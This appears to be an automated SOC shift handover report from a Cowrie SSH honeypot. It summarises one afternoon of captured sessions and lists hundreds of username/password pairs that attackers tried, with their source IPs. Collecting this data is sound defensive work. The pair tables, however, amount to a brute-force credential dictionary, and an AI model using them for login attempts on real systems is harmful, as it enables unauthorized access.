# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-04 |
| **Generated At** | 2026-07-04T17:11:18Z |
| **Shift Time** | 17:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **588** |
| Confirmed Threats | **495** |
| False Positives Filtered | **93** (15.8%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **13** |
| High Severity Cases | **393** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **195** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **418** |
| Unique Credential Pairs | **343** |
| Unique Usernames | **152** |
| Unique Passwords | **224** |
| Successful Auth Pairs | **369** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 115 |
| `support` | 41 |
| `admin` | 12 |
| `user` | 11 |
| `deploy` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 40 |
| `123456` | 26 |
| `1234` | 13 |
| `123` | 13 |
| `12345` | 10 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 40 |
| `root` | `LeitboGi0ro` | 9 |
| `root` | `123@@@` | 6 |
| `root` | `smo@@kkklss` | 6 |
| `345gs5662d34` | `345gs5662d34` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `deploy` | `1` | `45.153.34.235` | 2026-07-04T14:55:03 |
| `aaa` | `chris` | `45.153.34.235` | 2026-07-04T14:55:07 |
| `pi` | `12345678` | `45.153.34.235` | 2026-07-04T14:55:10 |
| `webuser` | `webuser` | `45.153.34.235` | 2026-07-04T14:55:14 |
| `dmdba` | `dmdba123456` | `45.153.34.235` | 2026-07-04T14:55:17 |
| `root` | `Aaaa1111` | `45.153.34.235` | 2026-07-04T14:55:20 |
| `debian` | `Aa123456.` | `45.153.34.235` | 2026-07-04T14:55:24 |
| `bob` | `1234` | `45.153.34.235` | 2026-07-04T14:55:27 |
| `root` | `Aa123321` | `45.153.34.235` | 2026-07-04T14:55:31 |
| `root` | `qwerty12` | `185.242.3.195` | 2026-07-04T14:55:32 |
| `liyang` | `123456` | `45.153.34.235` | 2026-07-04T14:55:34 |
| `ai` | `ai` | `45.153.34.235` | 2026-07-04T14:55:37 |
| `crafty` | `12345678` | `45.153.34.235` | 2026-07-04T14:55:41 |
| `user` | `12345` | `45.153.34.235` | 2026-07-04T14:55:44 |
| `user` | `user123456` | `45.153.34.235` | 2026-07-04T14:55:47 |
| `fa` | `fa` | `45.153.34.235` | 2026-07-04T14:55:50 |
| `root` | `!qaz@WSX` | `45.153.34.235` | 2026-07-04T14:55:54 |
| `rancher` | `rancher` | `45.153.34.235` | 2026-07-04T14:55:57 |
| `ossuser` | `Changeme_123` | `45.153.34.235` | 2026-07-04T14:56:00 |
| `deploy` | `123123` | `45.153.34.235` | 2026-07-04T14:56:03 |
| `btc` | `btc` | `45.153.34.235` | 2026-07-04T14:56:06 |
| `root` | `CatCult2025!` | `45.153.34.235` | 2026-07-04T14:56:10 |
| `root` | `Abc12345` | `45.153.34.235` | 2026-07-04T14:56:13 |
| `hadoop` | `hadoop` | `45.153.34.235` | 2026-07-04T14:56:16 |
| `root` | `Abc123456` | `45.153.34.235` | 2026-07-04T14:56:19 |
| `odoo17` | `odoo` | `45.153.34.235` | 2026-07-04T14:56:22 |
| `core` | `1qaz2wsx` | `45.153.34.235` | 2026-07-04T14:56:26 |
| `sam` | `1234` | `45.153.34.235` | 2026-07-04T14:56:29 |
| `admin` | `root` | `45.153.34.235` | 2026-07-04T14:56:32 |
| `openclaw` | `123` | `45.153.34.235` | 2026-07-04T14:56:35 |
| `appuser` | `123456` | `45.153.34.235` | 2026-07-04T14:56:39 |
| `root` | `qwe123456` | `45.153.34.235` | 2026-07-04T14:56:42 |
| `test` | `test123` | `45.153.34.235` | 2026-07-04T14:56:45 |
| `dev` | `123` | `45.153.34.235` | 2026-07-04T14:56:48 |
| `jack` | `jack` | `45.153.34.235` | 2026-07-04T14:56:51 |
| `ubuntu` | `Aa123456` | `45.153.34.235` | 2026-07-04T14:56:54 |
| `root` | `AA123456` | `45.153.34.235` | 2026-07-04T14:56:58 |
| `dev` | `dev` | `45.153.34.235` | 2026-07-04T14:57:01 |
| `system` | `12345` | `45.153.34.235` | 2026-07-04T14:57:04 |
| `tomcat` | `tomcat` | `45.153.34.235` | 2026-07-04T14:57:07 |
| `ftpuser1` | `123456` | `45.153.34.235` | 2026-07-04T14:57:10 |
| `jenkins` | `jenkins@123` | `45.153.34.235` | 2026-07-04T14:57:14 |
| `frappe` | `frappe` | `45.153.34.235` | 2026-07-04T14:57:17 |
| `root` | `rootrootroot` | `45.153.34.235` | 2026-07-04T14:57:20 |
| `sam` | `abc123` | `45.153.34.235` | 2026-07-04T14:57:23 |
| `dani` | `dani` | `45.153.34.235` | 2026-07-04T14:57:26 |
| `pi` | `toor` | `45.153.34.235` | 2026-07-04T14:57:30 |
| `clawdbot` | `clawdbot` | `45.153.34.235` | 2026-07-04T14:57:33 |
| `root` | `Aa112211..` | `45.153.34.235` | 2026-07-04T14:57:36 |
| `ftpuser` | `ftpuser123` | `45.153.34.235` | 2026-07-04T14:57:39 |
| `user1` | `modzmodz` | `45.153.34.235` | 2026-07-04T14:57:43 |
| `root` | `Password1` | `45.153.34.235` | 2026-07-04T14:57:46 |
| `admin` | `1234` | `45.153.34.235` | 2026-07-04T14:57:49 |
| `root` | `qwe@123321` | `45.198.224.120` | 2026-07-04T14:57:50 |
| `user` | `user1234` | `45.153.34.235` | 2026-07-04T14:57:52 |
| `coder` | `123456` | `45.153.34.235` | 2026-07-04T14:57:56 |
| `root` | `Aa@123456` | `45.153.34.235` | 2026-07-04T14:57:59 |
| `newuser` | `newuser` | `45.153.34.235` | 2026-07-04T14:58:02 |
| `nexus` | `pi` | `45.153.34.235` | 2026-07-04T14:58:06 |
| `root` | `P@ssw0rd2026` | `45.153.34.235` | 2026-07-04T14:58:09 |
| `user` | `user` | `45.153.34.235` | 2026-07-04T14:58:12 |
| `trinity` | `trinity` | `45.153.34.235` | 2026-07-04T14:58:16 |
| `root` | `1qaz2wsx` | `45.153.34.235` | 2026-07-04T14:58:19 |
| `potok` | `potok` | `45.153.34.235` | 2026-07-04T14:58:22 |
| `odoo14` | `odoo14` | `45.153.34.235` | 2026-07-04T14:58:25 |
| `john` | `john` | `45.153.34.235` | 2026-07-04T14:58:29 |
| `mysql` | `mysql123` | `45.153.34.235` | 2026-07-04T14:58:32 |
| `bernard` | `bernard` | `45.153.34.235` | 2026-07-04T14:58:36 |
| `admin2` | `admin2` | `45.153.34.235` | 2026-07-04T14:58:39 |
| `user` | `qwe123456` | `45.153.34.235` | 2026-07-04T14:58:42 |
| `sam` | `1234567890` | `45.153.34.235` | 2026-07-04T14:58:45 |
| `admin` | `Admin@123` | `45.153.34.235` | 2026-07-04T14:58:49 |
| `manoj` | `manoj123` | `45.153.34.235` | 2026-07-04T14:58:52 |
| `gabriel` | `gabriel` | `45.153.34.235` | 2026-07-04T14:58:55 |
| `root` | `nimda` | `45.153.34.235` | 2026-07-04T14:58:58 |
| `odoo16` | `odoo16` | `45.153.34.235` | 2026-07-04T14:59:02 |
| `rdpuser` | `rdpuser` | `45.153.34.235` | 2026-07-04T14:59:05 |
| `user1` | `123456` | `45.153.34.235` | 2026-07-04T14:59:08 |
| `nexus` | `nexus` | `45.153.34.235` | 2026-07-04T14:59:12 |
| `root` | `qwerty12` | `10.0.0.73` | 2026-07-04T14:59:14 |
| `claude` | `password` | `45.153.34.235` | 2026-07-04T14:59:15 |
| `cloud` | `cloud123!` | `45.153.34.235` | 2026-07-04T14:59:18 |
| `deployer` | `12345678` | `45.153.34.235` | 2026-07-04T14:59:21 |
| `linux` | `linux` | `45.153.34.235` | 2026-07-04T14:59:24 |
| `user` | `1234` | `45.153.34.235` | 2026-07-04T14:59:28 |
| `martin` | `martin` | `45.153.34.235` | 2026-07-04T14:59:31 |
| `devops` | `123456` | `45.153.34.235` | 2026-07-04T14:59:34 |
| `oracle` | `oracle123` | `45.153.34.235` | 2026-07-04T14:59:38 |
| `admin1` | `redhat` | `45.153.34.235` | 2026-07-04T14:59:41 |
| `avax` | `avax` | `45.153.34.235` | 2026-07-04T14:59:44 |
| `user` | `111111` | `45.153.34.235` | 2026-07-04T14:59:47 |
| `server` | `root` | `45.153.34.235` | 2026-07-04T14:59:51 |
| `usuario` | `usuario` | `45.153.34.235` | 2026-07-04T14:59:54 |
| `nutanix` | `nutanix/4u` | `45.153.34.235` | 2026-07-04T14:59:57 |
| `bot` | `123456` | `45.153.34.235` | 2026-07-04T15:00:00 |
| `ubuntu` | `1234qwer` | `45.153.34.235` | 2026-07-04T15:00:04 |
| `root` | `a123456A` | `45.153.34.235` | 2026-07-04T15:00:07 |
| `david` | `david` | `45.153.34.235` | 2026-07-04T15:00:11 |
| `claude` | `abc123` | `45.153.34.235` | 2026-07-04T15:00:14 |
| `customer` | `customer` | `45.153.34.235` | 2026-07-04T15:00:18 |
| `a` | `a` | `45.153.34.235` | 2026-07-04T15:00:21 |
| `deploy` | `123456` | `45.153.34.235` | 2026-07-04T15:00:24 |
| `root` | `linux` | `45.153.34.235` | 2026-07-04T15:00:28 |
| `newuser` | `123456` | `45.153.34.235` | 2026-07-04T15:00:31 |
| `myuser` | `123456` | `45.153.34.235` | 2026-07-04T15:00:35 |
| `teamspeak` | `1` | `45.153.34.235` | 2026-07-04T15:00:38 |
| `user4` | `user4` | `45.153.34.235` | 2026-07-04T15:00:41 |
| `hduser` | `hduser` | `45.153.34.235` | 2026-07-04T15:00:45 |
| `hamed` | `hamed` | `45.153.34.235` | 2026-07-04T15:00:48 |
| `ec2-user` | `123456` | `45.153.34.235` | 2026-07-04T15:00:52 |
| `postgres` | `1` | `45.153.34.235` | 2026-07-04T15:00:55 |
| `pi` | `p@ssw0rd` | `45.153.34.235` | 2026-07-04T15:00:58 |
| `admin` | `E4IuG88G` | `45.153.34.235` | 2026-07-04T15:01:02 |
| `test` | `test1234` | `45.153.34.235` | 2026-07-04T15:01:05 |
| `root` | `1Q2w3e4r` | `45.153.34.235` | 2026-07-04T15:01:08 |
| `admin` | `111` | `45.153.34.235` | 2026-07-04T15:01:12 |
| `opc` | `opc` | `45.153.34.235` | 2026-07-04T15:01:15 |
| `data` | `test` | `45.153.34.235` | 2026-07-04T15:01:18 |
| `odoo17` | `odoo17` | `45.153.34.235` | 2026-07-04T15:01:22 |
| `root` | `helloworld` | `45.153.34.235` | 2026-07-04T15:01:25 |
| `runner` | `1` | `45.153.34.235` | 2026-07-04T15:01:29 |
| `root` | `toor` | `45.153.34.235` | 2026-07-04T15:01:32 |
| `steam` | `steam123` | `45.153.34.235` | 2026-07-04T15:01:35 |
| `vncuser` | `password` | `45.153.34.235` | 2026-07-04T15:01:39 |
| `root` | `Qwerty123` | `45.153.34.235` | 2026-07-04T15:01:42 |
| `odoo14` | `odoo` | `45.153.34.235` | 2026-07-04T15:01:45 |
| `admin` | `123123` | `45.153.34.235` | 2026-07-04T15:01:49 |
| `root` | `11` | `45.153.34.235` | 2026-07-04T15:01:52 |
| `nagios` | `nagios` | `45.153.34.235` | 2026-07-04T15:01:55 |
| `frappe` | `frappe123` | `45.153.34.235` | 2026-07-04T15:01:59 |
| `claude` | `claude123` | `45.153.34.235` | 2026-07-04T15:02:02 |
| `user2` | `1` | `45.153.34.235` | 2026-07-04T15:02:06 |
| `admin1` | `12345678` | `45.153.34.235` | 2026-07-04T15:02:09 |
| `root` | `password` | `45.153.34.235` | 2026-07-04T15:02:13 |
| `test` | `test` | `45.153.34.235` | 2026-07-04T15:02:16 |
| `vagrant` | `vagrant` | `45.153.34.235` | 2026-07-04T15:02:19 |
| `test` | `test@123` | `45.153.34.235` | 2026-07-04T15:02:23 |
| `splunk` | `splunk` | `45.153.34.235` | 2026-07-04T15:02:26 |
| `localhost` | `localhost` | `45.153.34.235` | 2026-07-04T15:02:29 |
| `jenkins` | `jenkins` | `45.153.34.235` | 2026-07-04T15:02:33 |
| `root1` | `1` | `45.153.34.235` | 2026-07-04T15:02:36 |
| `www` | `user` | `45.153.34.235` | 2026-07-04T15:02:40 |
| `main` | `12345` | `45.153.34.235` | 2026-07-04T15:02:43 |
| `term2` | `term2` | `45.153.34.235` | 2026-07-04T15:02:46 |
| `cloud-user` | `password` | `45.153.34.235` | 2026-07-04T15:02:50 |
| `rdpuser` | `123456789` | `45.153.34.235` | 2026-07-04T15:02:53 |
| `arthur` | `arthur` | `45.153.34.235` | 2026-07-04T15:02:56 |
| `deployer` | `deployer123` | `45.153.34.235` | 2026-07-04T15:03:00 |
| `fivem` | `fivem` | `45.153.34.235` | 2026-07-04T15:03:03 |
| `user` | `123456` | `45.153.34.235` | 2026-07-04T15:03:07 |
| `root` | `Admin@123456` | `45.153.34.235` | 2026-07-04T15:03:10 |
| `test3` | `1` | `45.153.34.235` | 2026-07-04T15:03:14 |
| `root` | `hello123` | `45.153.34.235` | 2026-07-04T15:03:17 |
| `deploy` | `root` | `45.153.34.235` | 2026-07-04T15:03:20 |
| `username` | `username` | `45.153.34.235` | 2026-07-04T15:03:23 |
| `kipt` | `kipt` | `45.153.34.235` | 2026-07-04T15:03:27 |
| `kingbase` | `123456` | `45.153.34.235` | 2026-07-04T15:03:30 |
| `deploy` | `1234` | `45.153.34.235` | 2026-07-04T15:03:34 |
| `adminuser` | `123456` | `45.153.34.235` | 2026-07-04T15:03:37 |
| `rock` | `rock` | `45.153.34.235` | 2026-07-04T15:03:40 |
| `app` | `rootroot` | `45.153.34.235` | 2026-07-04T15:03:44 |
| `admin` | `admin` | `45.153.34.235` | 2026-07-04T15:03:47 |
| `support` | `123` | `45.153.34.235` | 2026-07-04T15:03:50 |
| `martin` | `123456` | `45.153.34.235` | 2026-07-04T15:03:54 |
| `labuser` | `labuser` | `45.153.34.235` | 2026-07-04T15:03:57 |
| `docker` | `docker123` | `45.153.34.235` | 2026-07-04T15:04:00 |
| `tester` | `12345` | `45.153.34.235` | 2026-07-04T15:04:04 |
| `portal` | `portal` | `45.153.34.235` | 2026-07-04T15:04:07 |
| `ubuntu` | `1` | `45.153.34.235` | 2026-07-04T15:04:11 |
| `cloud` | `1` | `45.153.34.235` | 2026-07-04T15:04:14 |
| `deployer` | `1234567890` | `45.153.34.235` | 2026-07-04T15:04:17 |
| `root` | `dxfUgwfiNcx8` | `45.153.34.235` | 2026-07-04T15:04:21 |
| `trader` | `trader` | `45.153.34.235` | 2026-07-04T15:04:24 |
| `drcomadmin` | `drcomadmin123` | `45.153.34.235` | 2026-07-04T15:04:28 |
| `www` | `www` | `45.153.34.235` | 2026-07-04T15:04:31 |
| `root` | `123qwe!@` | `45.153.34.235` | 2026-07-04T15:04:34 |
| `openclaw` | `user` | `45.153.34.235` | 2026-07-04T15:04:38 |
| `root` | `root@123` | `45.153.34.235` | 2026-07-04T15:04:41 |
| `root` | `qwerty` | `45.153.34.235` | 2026-07-04T15:04:44 |
| `user` | `git` | `45.153.34.235` | 2026-07-04T15:04:48 |
| `data` | `data` | `45.153.34.235` | 2026-07-04T15:04:51 |
| `ghost` | `ghost` | `45.153.34.235` | 2026-07-04T15:04:55 |
| `test1` | `test1` | `45.153.34.235` | 2026-07-04T15:04:58 |
| `root` | `zaq12wsx` | `45.153.34.235` | 2026-07-04T15:05:01 |
| `ftp` | `ftp123` | `45.153.34.235` | 2026-07-04T15:05:05 |
| `dev` | `abc123` | `45.153.34.235` | 2026-07-04T15:05:08 |
| `root` | `Aa123456@` | `45.153.34.235` | 2026-07-04T15:05:12 |
| `debian` | `debian` | `45.153.34.235` | 2026-07-04T15:05:15 |
| `root` | `12qwaszx` | `45.153.34.235` | 2026-07-04T15:05:18 |
| `user10` | `user10` | `45.153.34.235` | 2026-07-04T15:05:22 |
| `user` | `1qaz@WSX` | `45.153.34.235` | 2026-07-04T15:05:25 |
| `administrator` | `administrator` | `45.153.34.235` | 2026-07-04T15:05:29 |
| `root` | `zz12345` | `101.126.88.251` | 2026-07-04T15:05:31 |
| `demo` | `demo` | `45.153.34.235` | 2026-07-04T15:05:32 |
| `git` | `123` | `45.153.34.235` | 2026-07-04T15:05:35 |
| `345gs5662d34` | `345gs5662d34` | `101.126.88.251` | 2026-07-04T15:05:36 |
| `root` | `3245gs5662d34` | `101.126.88.251` | 2026-07-04T15:05:38 |
| `hadoop` | `123` | `45.153.34.235` | 2026-07-04T15:05:39 |
| `botuser` | `123` | `45.153.34.235` | 2026-07-04T15:05:42 |
| `sysupdate` | `123456` | `45.153.34.235` | 2026-07-04T15:05:45 |
| `steam` | `123` | `45.153.34.235` | 2026-07-04T15:05:49 |
| `toto` | `toto` | `45.153.34.235` | 2026-07-04T15:05:52 |
| `devops` | `1234` | `45.153.34.235` | 2026-07-04T15:05:55 |
| `root` | `p@ssword` | `45.153.34.235` | 2026-07-04T15:05:59 |
| `sam` | `123456789` | `45.153.34.235` | 2026-07-04T15:06:02 |
| `aaa` | `123456` | `45.153.34.235` | 2026-07-04T15:06:05 |
| `root` | `qazwsx123` | `45.153.34.235` | 2026-07-04T15:06:09 |
| `ansible` | `passwd` | `45.153.34.235` | 2026-07-04T15:06:12 |
| `root` | `1q2w3e4r` | `45.153.34.235` | 2026-07-04T15:06:15 |
| `amine` | `amine` | `45.153.34.235` | 2026-07-04T15:06:19 |
| `teamspeak` | `teamspeak` | `45.153.34.235` | 2026-07-04T15:06:22 |
| `root` | `admin123` | `45.153.34.235` | 2026-07-04T15:06:26 |
| `dev` | `1qaz2wsx` | `45.153.34.235` | 2026-07-04T15:06:29 |
| `config` | `config` | `45.153.34.235` | 2026-07-04T15:06:32 |
| `frappe` | `admin` | `45.153.34.235` | 2026-07-04T15:06:36 |
| `systemd` | `1q2w3e4r` | `45.153.34.235` | 2026-07-04T15:06:39 |
| `ftpuser` | `ftpuser` | `45.153.34.235` | 2026-07-04T15:06:43 |
| `alex` | `alex` | `45.153.34.235` | 2026-07-04T15:06:46 |
| `kafka` | `kafka` | `45.153.34.235` | 2026-07-04T15:06:49 |
| `root` | `Admin@123` | `45.153.34.235` | 2026-07-04T15:06:53 |
| `devuser` | `devuser` | `45.153.34.235` | 2026-07-04T15:06:56 |
| `deployer` | `123456` | `45.153.34.235` | 2026-07-04T15:06:59 |
| `system` | `system` | `45.153.34.235` | 2026-07-04T15:07:03 |
| `root` | `Test1234` | `45.153.34.235` | 2026-07-04T15:07:07 |
| `azureuser` | `12345` | `45.153.34.235` | 2026-07-04T15:07:10 |
| `minecraft` | `123` | `45.153.34.235` | 2026-07-04T15:07:13 |
| `openclaw` | `1234` | `45.153.34.235` | 2026-07-04T15:07:17 |
| `root` | `Admin123!@#` | `45.153.34.235` | 2026-07-04T15:07:20 |
| `odoo16` | `123` | `45.153.34.235` | 2026-07-04T15:07:23 |
| `vpn` | `vpn` | `45.153.34.235` | 2026-07-04T15:07:27 |
| `testuser` | `testuser` | `45.153.34.235` | 2026-07-04T15:07:30 |
| `master` | `passwd` | `45.153.34.235` | 2026-07-04T15:07:34 |
| `steam` | `steam` | `45.153.34.235` | 2026-07-04T15:07:37 |
| `appuser` | `test` | `45.153.34.235` | 2026-07-04T15:07:41 |
| `root` | `Abcd1234` | `45.153.34.235` | 2026-07-04T15:07:44 |
| `calvin` | `calvin` | `45.153.34.235` | 2026-07-04T15:07:47 |
| `tom` | `111111` | `45.153.34.235` | 2026-07-04T15:07:51 |
| `root` | `147258` | `45.153.34.235` | 2026-07-04T15:07:54 |
| `root` | `changemeNOW` | `45.153.34.235` | 2026-07-04T15:07:57 |
| `crafty` | `1234` | `45.153.34.235` | 2026-07-04T15:08:01 |
| `root` | `q1w2e3r4` | `45.153.34.235` | 2026-07-04T15:08:04 |
| `odoo17` | `12345` | `45.153.34.235` | 2026-07-04T15:08:07 |
| `debian` | `123456` | `45.153.34.235` | 2026-07-04T15:08:11 |
| `deployer` | `user` | `45.153.34.235` | 2026-07-04T15:08:14 |
| `user2` | `user2` | `45.153.34.235` | 2026-07-04T15:08:17 |
| `root` | `abc12345` | `45.153.34.235` | 2026-07-04T15:08:21 |
| `student` | `redhat` | `45.153.34.235` | 2026-07-04T15:08:24 |
| `lin` | `123456` | `45.153.34.235` | 2026-07-04T15:08:27 |
| `root` | `nPSpP4PBW0` | `45.153.34.235` | 2026-07-04T15:08:30 |
| `ark` | `ark` | `45.153.34.235` | 2026-07-04T15:08:34 |
| `jay` | `jay` | `45.153.34.235` | 2026-07-04T15:08:37 |
| `minecraft` | `123123` | `45.153.34.235` | 2026-07-04T15:08:40 |
| `kali` | `kali` | `45.153.34.235` | 2026-07-04T15:08:44 |
| `odoo` | `123` | `45.153.34.235` | 2026-07-04T15:08:47 |
| `zimbra` | `zimbra` | `45.153.34.235` | 2026-07-04T15:08:50 |
| `onkar` | `onkar123` | `45.153.34.235` | 2026-07-04T15:08:53 |
| `sdadmin` | `51nGleD` | `45.153.34.235` | 2026-07-04T15:08:57 |
| `claude` | `claude` | `45.153.34.235` | 2026-07-04T15:09:00 |
| `myuser` | `root` | `45.153.34.235` | 2026-07-04T15:09:03 |
| `deployer` | `dev` | `45.153.34.235` | 2026-07-04T15:09:06 |
| `user1` | `root@123` | `45.153.34.235` | 2026-07-04T15:09:09 |
| `user` | `111` | `45.153.34.235` | 2026-07-04T15:09:12 |
| `jellyfin` | `123` | `45.153.34.235` | 2026-07-04T15:09:16 |
| `odoo18` | `odoo` | `45.153.34.235` | 2026-07-04T15:09:19 |
| `student` | `student` | `45.153.34.235` | 2026-07-04T15:09:22 |
| `devops` | `12345` | `45.153.34.235` | 2026-07-04T15:09:25 |
| `ubuntu` | `123456789` | `45.153.34.235` | 2026-07-04T15:09:29 |
| `username` | `password` | `45.153.34.235` | 2026-07-04T15:09:32 |
| `root` | `LeitboGi0ro` | `45.153.34.235` | 2026-07-04T15:09:35 |
| `runner` | `123` | `45.153.34.235` | 2026-07-04T15:09:38 |
| `oscar` | `1234` | `45.153.34.235` | 2026-07-04T15:09:41 |
| `redhat` | `redhat` | `45.153.34.235` | 2026-07-04T15:09:45 |
| `support` | `support` | `176.53.159.196` | 2026-07-04T15:09:46 |
| `vm` | `vm` | `45.153.34.235` | 2026-07-04T15:09:48 |
| `root` | `Password` | `45.153.34.235` | 2026-07-04T15:09:51 |
| `runner` | `1234` | `45.153.34.235` | 2026-07-04T15:09:54 |
| `ansible` | `ansible` | `45.153.34.235` | 2026-07-04T15:09:58 |
| `support` | `support` | `10.0.0.73` | 2026-07-04T15:10:00 |
| `dmdba` | `123456` | `45.153.34.235` | 2026-07-04T15:10:01 |
| `deploy` | `deploy` | `45.153.34.235` | 2026-07-04T15:10:04 |
| `tester` | `test` | `45.153.34.235` | 2026-07-04T15:10:07 |
| `root` | `!Q2w3e4r` | `45.153.34.235` | 2026-07-04T15:10:10 |
| `reza` | `reza` | `45.153.34.235` | 2026-07-04T15:10:14 |
| `root` | `qwe123!@` | `45.153.34.235` | 2026-07-04T15:10:17 |
| `root` | `admin@123` | `45.153.34.235` | 2026-07-04T15:10:20 |
| `root` | `!Q@W3e4r` | `45.153.34.235` | 2026-07-04T15:10:24 |
| `teamspeak` | `123456` | `45.153.34.235` | 2026-07-04T15:10:27 |
| `aiuser` | `aiuser` | `45.153.34.235` | 2026-07-04T15:10:33 |
| `root` | `qaz1wsx2!@#` | `45.198.224.120` | 2026-07-04T15:10:34 |
| `test1` | `123456789` | `45.153.34.235` | 2026-07-04T15:10:37 |
| `teamspeak` | `root` | `45.153.34.235` | 2026-07-04T15:10:40 |
| `root` | `123123123` | `45.153.34.235` | 2026-07-04T15:10:43 |
| `user2` | `123` | `45.153.34.235` | 2026-07-04T15:10:46 |
| `root` | `12345qwe` | `45.153.34.235` | 2026-07-04T15:10:49 |
| `root` | `welcome1` | `45.153.34.235` | 2026-07-04T15:10:53 |
| `root` | `test123` | `45.153.34.235` | 2026-07-04T15:10:56 |
| `root` | `111` | `45.153.34.235` | 2026-07-04T15:10:59 |
| `node` | `123456` | `45.153.34.235` | 2026-07-04T15:11:02 |
| `tactical` | `tactical` | `45.153.34.235` | 2026-07-04T15:11:05 |
| `root` | `!QAZ2wsx` | `45.153.34.235` | 2026-07-04T15:11:09 |
| `root` | `Ac123456` | `45.153.34.235` | 2026-07-04T15:11:12 |
| `master` | `master` | `45.153.34.235` | 2026-07-04T15:11:15 |
| `appuser` | `12345` | `45.153.34.235` | 2026-07-04T15:11:18 |
| `deploy` | `deploy123` | `45.153.34.235` | 2026-07-04T15:11:21 |
| `postgres` | `postgres` | `45.153.34.235` | 2026-07-04T15:11:24 |
| `ubuntu` | `qwer1234` | `45.153.34.235` | 2026-07-04T15:11:28 |
| `root` | `102030` | `45.153.34.235` | 2026-07-04T15:11:31 |
| `git` | `1234` | `45.153.34.235` | 2026-07-04T15:11:34 |
| `admin` | `admin123!` | `45.153.34.235` | 2026-07-04T15:11:37 |
| `omm` | `omm` | `45.153.34.235` | 2026-07-04T15:11:40 |
| `fivem` | `password` | `45.153.34.235` | 2026-07-04T15:11:43 |
| `neptune` | `neptune` | `45.153.34.235` | 2026-07-04T15:11:46 |
| `ftpuser` | `123456` | `45.153.34.235` | 2026-07-04T15:11:50 |
| `root` | `quality` | `45.198.224.120` | 2026-07-04T15:23:03 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-04T15:32:31 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-04T15:32:31 |
| `root` | `111111` | `2.57.122.168` | 2026-07-04T15:33:19 |
| `root` | `123123` | `2.57.122.168` | 2026-07-04T15:35:30 |
| `root` | `Password123456` | `45.198.224.120` | 2026-07-04T15:35:45 |
| `root` | `1234` | `2.57.122.168` | 2026-07-04T15:37:38 |
| `root` | `12345` | `2.57.122.168` | 2026-07-04T15:39:40 |
| `root` | `12345678` | `2.57.122.168` | 2026-07-04T15:43:45 |
| `root` | `123456789` | `2.57.122.168` | 2026-07-04T15:45:37 |
| `root` | `docker` | `36.212.129.250` | 2026-07-04T15:47:27 |
| `root` | `Password1` | `2.57.122.168` | 2026-07-04T15:47:37 |
| `root` | `Root123` | `45.198.224.120` | 2026-07-04T15:48:15 |
| `root` | `admin` | `2.57.122.168` | 2026-07-04T15:49:29 |
| `rds` | `rds` | `185.242.3.195` | 2026-07-04T15:51:17 |
| `root` | `admin123` | `2.57.122.168` | 2026-07-04T15:51:22 |
| `root` | `default` | `2.57.122.168` | 2026-07-04T15:53:18 |
| `root` | `letmein` | `2.57.122.168` | 2026-07-04T15:55:17 |
| `root` | `passw0rd` | `2.57.122.168` | 2026-07-04T15:57:22 |
| `root` | `password` | `2.57.122.168` | 2026-07-04T15:59:35 |
| `photo` | `photo` | `45.198.224.120` | 2026-07-04T16:00:53 |
| `root` | `qwerty` | `2.57.122.168` | 2026-07-04T16:01:48 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-04T16:02:27 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-04T16:02:28 |
| `root` | `system` | `2.57.122.168` | 2026-07-04T16:06:30 |
| `root` | `toor` | `2.57.122.168` | 2026-07-04T16:08:54 |
| `admin` | `111111` | `2.57.122.168` | 2026-07-04T16:11:31 |
| `root` | `qwasyx21` | `45.198.224.120` | 2026-07-04T16:13:02 |
| `admin` | `123123` | `2.57.122.168` | 2026-07-04T16:14:21 |
| `admin` | `1234` | `2.57.122.168` | 2026-07-04T16:17:28 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-04T16:18:14 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-04T16:18:15 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-04T16:18:22 |
| `admin` | `12345` | `2.57.122.168` | 2026-07-04T16:20:51 |
| `root` | `0000000000000000` | `103.186.1.158` | 2026-07-04T16:22:56 |
| `345gs5662d34` | `345gs5662d34` | `103.186.1.158` | 2026-07-04T16:23:00 |
| `root` | `3245gs5662d34` | `103.186.1.158` | 2026-07-04T16:23:02 |
| `reza` | `reza123456` | `102.210.149.236` | 2026-07-04T16:24:17 |
| `345gs5662d34` | `345gs5662d34` | `102.210.149.236` | 2026-07-04T16:24:21 |
| `reza` | `3245gs5662d34` | `102.210.149.236` | 2026-07-04T16:24:24 |
| `root` | `Pa$$w0rd.2016` | `45.198.224.120` | 2026-07-04T16:25:16 |
| `ubuntu` | `qaz123!@#` | `154.221.20.92` | 2026-07-04T16:26:29 |
| `345gs5662d34` | `345gs5662d34` | `154.221.20.92` | 2026-07-04T16:26:33 |
| `ubuntu` | `3245gs5662d34` | `154.221.20.92` | 2026-07-04T16:26:34 |
| `root` | `123@@@` | `140.245.50.204` | 2026-07-04T16:27:43 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-07-04T16:27:43 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-07-04T16:27:48 |
| `root` | `qazwsx123` | `43.245.248.2` | 2026-07-04T16:28:05 |
| `345gs5662d34` | `345gs5662d34` | `43.245.248.2` | 2026-07-04T16:28:09 |
| `root` | `3245gs5662d34` | `43.245.248.2` | 2026-07-04T16:28:11 |
| `rds` | `rds` | `10.0.0.73` | 2026-07-04T16:32:00 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-04T16:32:06 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-04T16:32:06 |
